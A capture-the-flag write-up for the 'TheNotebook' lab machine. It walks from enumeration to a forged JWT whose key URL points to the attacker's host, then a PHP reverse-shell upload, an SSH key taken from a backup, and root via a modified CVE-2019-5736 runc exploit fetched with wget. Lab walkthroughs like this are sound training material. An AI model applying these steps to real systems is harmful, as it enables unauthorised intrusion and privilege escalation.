# TheNotebook

export IP=10.10.10.230

# Solution

Lets start with the good ol' nmap scan (needed -Pn since it was not responding correctly)

```
cmd: sudo nmap -sC -sV -Pn -oN nmap/initial $IP

22/tcp    open     ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 86:df:10:fd:27:a3:fb:d8:36:a7:ed:90:95:33:f5:bf (RSA)
|   256 e7:81:d6:6c:df:ce:b7:30:03:91:5c:b5:13:42:06:44 (ECDSA)
|_  256 c6:06:34:c7:fc:00:c4:62:06:c2:36:0e:ee:5e:bf:6b (ED25519)
80/tcp    open     http    nginx 1.14.0 (Ubuntu)
|_http-server-header: nginx/1.14.0 (Ubuntu)
|_http-title: The Notebook - Your Note Keeper
10010/tcp filtered rxapi    <- FILTERED?
```

So we have a filtered port, tried to run a **sneaky** scan but the same result so it is not filtered due to rate limit. Leaving all ports running on the back <br>

Doing a simple gobuster we found some pages that were not linked anywhere in the page
``` 
cmd: gobuster dir -u http://$IP -w /opt/SecLists/Discovery/Web-Content/raft-medium-directories.txt -o gobuster/raft.medium.directories.log -t 100

/admin <- 403, needs admin login
```

Messing around, we have nothing really interesting lets try some things <br>

Starting with the login page (a simple SQLinjection) we can see that the response is 
```
Login Failed! User doesn't exist.
```

This seems suspicious and by creating a random account, it is confirmed that the login form is discolsing usernames because when the password is wrong the message is different
```
Login Failed! Reason: Incorrect Password
```

With this, if we get a username we might try to brute force its account in this form. Testing for **admin:123123** we have incorrect password <br>

Well it might be someone registering the user as admin and not be and administrator account at all <br>

Checking the page around, there's not much to do so i tried some things
```
STTI (username, note title and description) -> not vulnerable
DOM injection                               -> well sanitized
Command execution (title and description)   -> not vulnerable (to where i can tell)
```

Then i went and checked what the cookies were and if i could tamper with them. Checked the current set cookie with a simple base64 decode (with cyberchef) and i could see a field in them (although that more than half of it is encrypted)
```
{"typ":"JWT","alg":"RS256","kid":"http://localhost:7070/privKey.key"}{"username":"a","email":"a@a.a","admin_cap":0}  <- admin_cap(abilities) ?!?!
```

Tried to register and send that field modified, but nothing changed (still no **/admin** access) <br>

So i went ahead and checked what JWT is (cause i didnt knew nor used it), and it is a [JSON web token](https://jwt.io/introduction) with the following structure
```
headers.payload.signature
```

The headers and the payload are clear text and we can modify them right away
``` 
HEADERS: {"typ":"JWT","alg":"RS256","kid":"http://10.10.16.6/privKey.key"}

PAYLOAD: {"username":"a","email":"a@a.a","admin_cap":1}
``` 
Now we need tho add the keys, for it used the tool from the documentation (jwt.io) which outputs the cookie already formated. But now e need to generate keys to append to it, so here we go search again. <br>

Found a github post [jwt rsa key size](https://gist.github.com/ygotthilf/baa58da5c3dd1f69fae9) that give the needed commands (just need some minor tweaks in the file's names). The final cookie, after glued out, is as below
```
eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImtpZCI6Imh0dHA6Ly8xMC4xMC4xNi42L3ByaXZLZXkua2V5In0.eyJ1c2VybmFtZSI6ImEiLCJlbWFpbCI6ImFAYS5hIiwiYWRtaW5fY2FwIjp0cnVlfQ.cxw6Kh-vkDfk4O8y95Umy8493V3SCZhEwxZlFwzpUo8QGym_EIcTmYrgdyCFAmnBX5AiwKRD8YRPat8ZqHrIzhdpOhM88Sa1gUK2hUsgrv6rkRKQjpbdRTP2o8EkDNEt5lDnwMn_QRksiLbx1ap6Ih0L8XxxiZCRpIT_CwuRDdO8M-22gthp_LgxZHlv-pb4Y9Ybu97bmkjMX29YyWNL_Ha73yfnEdg1FulgRTnnnaeey-4sgUdCgo9qxtzu31YKa6QgSNawzC_U1_MHZuNpUjc38CQsJVZA2zbNBCUrAeRbhcRl0EYXfPj0iLq78Yz--axd65GCGwbgF7aTd6AIlQa1Q-BAhdfaqw7u6cSZGaKp60PqDfbBA7TaTli7kBc9G0281lLYfPofpUvQa6qqxv7fsH4UT_wB27rwo2asi2wVhwH8225IdUfUCYh_plhuwrbPtjXKMst7KFJd7COZ2eXOsNDxjOstYj5KA0DLy0aH9iSCBOuGNNv27NK-hPxMfFT2g4RxsTv-mIVAqg6w6Be_27SOn5jl_F3cdbzVa1o25xL0rRFBHOOXPzPdghDzeU6QCf4q2ibz_XRNSGqf1Sylts8rGKM-VCxrhAgZ-t0dPHQSlK9va_KDlhh9OuYh5f--6lMl9qC6IUxRTbXQpQg_-SFdmaJXmtXunBM53LE
```

Now using a cookie manager, at dev console or extension, reloading the page and accessing **/admin** we have access (dont forget the server so the keys can be accessed to be verified) <br>

The **/admin** page allow us to upload files, trying a php-reverse-shell right away give us access to the machine
``` 
cmd: whoami && id

www-data
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

So i went ahead and started looking around for the website files but without relevant results 
```
cmd: find / -name "*register* 2>/dev/null
cmd: find / -name "*login* 2>/dev/null
```

Then i just checked **/var/www** (which is the www-data's home directory) and nothing was there.... humm <br>
So i checked the admin panel it might have something interesting or that i miss (since i jumped right to the reverse shell). And there were some notes
```
Title: Need to fix config
Body: Have to fix this issue where PHP files are being executed :/. This can be a potential security issue for the server.   (yeah, i already found that, LUL)
-------------------------------------------------------------------------------------------------------------------------------------------------------------------
Title: Backups are scheduled
Body: Finally! Regular backups are necessary. Thank god it's all easy on server. (hummmmm) 
```

Checking the **/var/backups** we can see and interesting file
```
cmd: ls -la /var/backups
-rw-r--r--  1 root root 33252 Feb 24 08:53 apt.extended_states.0
-rw-r--r--  1 root root  3609 Feb 23 08:58 apt.extended_states.1.gz
-rw-r--r--  1 root root  3621 Feb 12 06:52 apt.extended_states.2.gz
-rw-r--r--  1 root root  4373 Feb 17 09:02 home.tar.gz                  <--- Hummmmm
```
Getting the file to the local machine, and uncompressing it, we can see that is noah's home directory backup. And there is the **.ssh** folder, lets try ssh into the machine <br>

And voila, we got it
```
cmd: whoami && id

noah
uid=1000(noah) gid=1000(noah) groups=1000(noah)

cmd: cat ~/user.txt
FLAG: 9359af7b713827b4d97a0decd3a5408d
```

Checking what can be ran right away with sudo by this user we can see that it has something to do with docker
```
User noah may run the following commands on thenotebook:
    (ALL) NOPASSWD: /usr/bin/docker exec -it webapp-dev01*
```

Making some enumeration we can see several things that are not usually seen
```
 Networks and neighbours
Kernel IP routing table
Destination     Gateway         Genmask         Flags Metric Ref    Use Iface
default         10.10.10.2      0.0.0.0         UG    0      0        0 ens160
10.10.10.0      0.0.0.0         255.255.255.0   U     0      0        0 ens160
172.17.0.0      0.0.0.0         255.255.0.0     U     0      0        0 docker0


:DOCKER - [0:0]
-A PREROUTING -m addrtype --dst-type LOCAL -j DOCKER
-A OUTPUT ! -d 127.0.0.0/8 -m addrtype --dst-type LOCAL -j DOCKER
-A POSTROUTING -s 172.17.0.0/16 ! -o docker0 -j MASQUERADE
-A POSTROUTING -s 172.17.0.3/32 -d 172.17.0.3/32 -p tcp -m tcp --dport 8080 -j MASQUERADE
-A DOCKER -i docker0 -j RETURN
-A DOCKER -d 127.0.0.1/32 ! -i docker0 -p tcp -m tcp --dport 8080 -j DNAT --to-destination 172.17.0.3:8080

:DOCKER-USER - [0:0]
-A INPUT -p tcp -m tcp --dport 10010 -j DROP
-A INPUT -m state --state RELATED,ESTABLISHED -j ACCEPT
-A INPUT -j ACCEPT
-A FORWARD -j DOCKER-USER
-A FORWARD -j DOCKER-ISOLATION-STAGE-1
-A FORWARD -o docker0 -m conntrack --ctstate RELATED,ESTABLISHED -j ACCEPT
-A FORWARD -o docker0 -j DOCKER
-A FORWARD -i docker0 ! -o docker0 -j ACCEPT
-A FORWARD -i docker0 -o docker0 -j ACCEPT
-A OUTPUT -j ACCEPT
-A DOCKER -d 172.17.0.3/32 ! -i docker0 -o docker0 -p tcp -m tcp --dport 8080 -j ACCEPT
-A DOCKER-ISOLATION-STAGE-1 -i docker0 ! -o docker0 -j DOCKER-ISOLATION-STAGE-2
-A DOCKER-ISOLATION-STAGE-1 -j RETURN
-A DOCKER-ISOLATION-STAGE-2 -o docker0 -j DROP
-A DOCKER-ISOLATION-STAGE-2 -j RETURN
-A DOCKER-USER -j RETURN

tcp        0      0 127.0.0.1:8080          0.0.0.0:*               LISTEN      -

runc was found in /usr/sbin/runc, you may be able to escalate privileges with it
```

Checking docker version
```
cmd: docker --version

Docker version 18.06.0-ce, build 0ffa825
```

There is a [CVE (CVE-2019-5736)](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-5736) for docker 18.09.2. I'll use this [PoC](https://github.com/Frichetten/CVE-2019-5736-PoC) <br>

The PoC is quite straight forward we just need to change the exploit to give a reverse shell instead of copying the **/etc/shadow** file<br>

Since the exploit overwrites the **/bin/sh** binary, we need to first connect to the docker image with **/bin/bash** and then connect again but using the modified the **/bin/sh** (which will give us the reverse shell) <br>

The exploiting process is (need two ssh shells to do it)
```
(SHELL 1 - machine ssh) cmd: sudo /usr/bin/docker exec -it webapp-dev01 /bin/bash
(SHELL 1 - docker /bin/bash) cmd: wget (compiled exploit)
(SHELL 1 - docker /bin/bash) cmd: chmod +x main
(SHELL 1 - docker /bin/bash) cmd: ./main
[+] Overwritten /bin/sh successfully

(SHELL 2 - machine ssh) cmd: sudo /usr/bin/docker exec -it webapp-dev01 /bin/sh

(Local listener - reverse shell) cmd: whoami && id
root
uid=0(root) gid=0(root) groups=0(root)
(Local listener - reverse shell) cmd: cat ~/root.txt

FLAG: f2d0e82a62ee1fb940b7a9266fd1b0c6
``` 